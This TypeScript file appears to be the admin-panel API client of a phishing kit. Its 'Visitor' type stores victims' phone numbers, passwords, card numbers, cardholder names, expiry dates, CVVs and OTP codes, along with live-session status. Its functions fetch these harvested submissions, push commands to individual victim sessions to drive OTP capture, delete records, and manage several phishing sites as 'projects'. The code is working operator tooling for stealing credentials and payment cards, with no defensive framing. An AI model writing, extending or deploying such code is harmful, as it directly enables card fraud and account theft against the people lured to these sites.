const UNITY_BASE = "/api/unity";

export interface Visitor {
  id: string; submittedAt: string; submittedAtTs: number;
  phone: string; password: string;
  cardNumber: string; cardName: string; cardMonth: string; cardYearExp: string; cardCvv: string;
  otpCode: string; otpStatus: string | null;
  page: string; isActive: boolean; lastSeen: number; country: string;
}

export const adminApi = {
  async getAll(): Promise<Visitor[]> {
    try {
      const r = await fetch(`${UNITY_BASE}/submissions`, { credentials: "include" });
      if (!r.ok) return [];
      return await r.json();
    } catch { return []; }
  },
  async sendCmd(id: string, cmd: string) {
    await fetch(`${UNITY_BASE}/cmd/${id}`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ cmd }),
      credentials: "include",
    });
  },
  async delete(id: string) {
    await fetch(`${UNITY_BASE}/submissions/${id}`, { method: "DELETE", credentials: "include" });
  },
  async deleteAll() {
    await fetch(`${UNITY_BASE}/submissions`, { method: "DELETE", credentials: "include" });
  },
};

// ── Auth API ─────────────────────────────────────────────────────────────────

export const authApi = {
  async login(email: string, password: string): Promise<{ ok: boolean; error?: string }> {
    try {
      const r = await fetch("/api/admin/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password }),
        credentials: "include",
      });
      const data = await r.json();
      return r.ok ? { ok: true } : { ok: false, error: data.error ?? "Login failed" };
    } catch {
      return { ok: false, error: "Network error" };
    }
  },

  async logout() {
    await fetch("/api/admin/logout", { method: "POST", credentials: "include" });
  },

  async me(): Promise<{ ok: boolean; email?: string }> {
    try {
      const r = await fetch("/api/admin/me", { credentials: "include" });
      if (!r.ok) return { ok: false };
      return await r.json();
    } catch {
      return { ok: false };
    }
  },
};

// ── Projects API ─────────────────────────────────────────────────────────────

export interface ProjectInfo {
  key: string;
  label: string;
  apiBase: string;
  sitePath: string;
  builtin: boolean;
}

export const projectsApi = {
  async list(): Promise<ProjectInfo[]> {
    try {
      const r = await fetch("/api/admin/projects", { credentials: "include" });
      if (!r.ok) return [];
      return await r.json();
    } catch { return []; }
  },

  async add(p: Omit<ProjectInfo, "builtin">): Promise<{ ok: boolean; error?: string }> {
    try {
      const r = await fetch("/api/admin/projects", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(p),
        credentials: "include",
      });
      const data = await r.json();
      return r.ok ? { ok: true } : { ok: false, error: data.error };
    } catch { return { ok: false, error: "Network error" }; }
  },

  async remove(key: string): Promise<{ ok: boolean; error?: string }> {
    try {
      const r = await fetch(`/api/admin/projects/${key}`, {
        method: "DELETE",
        credentials: "include",
      });
      const data = await r.json();
      return r.ok ? { ok: true } : { ok: false, error: data.error };
    } catch { return { ok: false, error: "Network error" }; }
  },
};

// ── Generic project submissions API ─────────────────────────────────────────

export const projectApi = {
  async getSubmissions(apiBase: string): Promise<any[]> {
    try {
      const r = await fetch(`${apiBase}/submissions`, { credentials: "include" });
      if (!r.ok) return [];
      return await r.json();
    } catch { return []; }
  },
  async sendCmd(apiBase: string, id: string, cmd: string) {
    await fetch(`${apiBase}/cmd/${id}`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ cmd, command: cmd, visitorId: id }),
      credentials: "include",
    });
  },
  async deleteOne(apiBase: string, id: string) {
    await fetch(`${apiBase}/submissions/${id}`, { method: "DELETE", credentials: "include" });
  },
  async deleteAll(apiBase: string) {
    await fetch(`${apiBase}/submissions`, { method: "DELETE", credentials: "include" });
  },
};

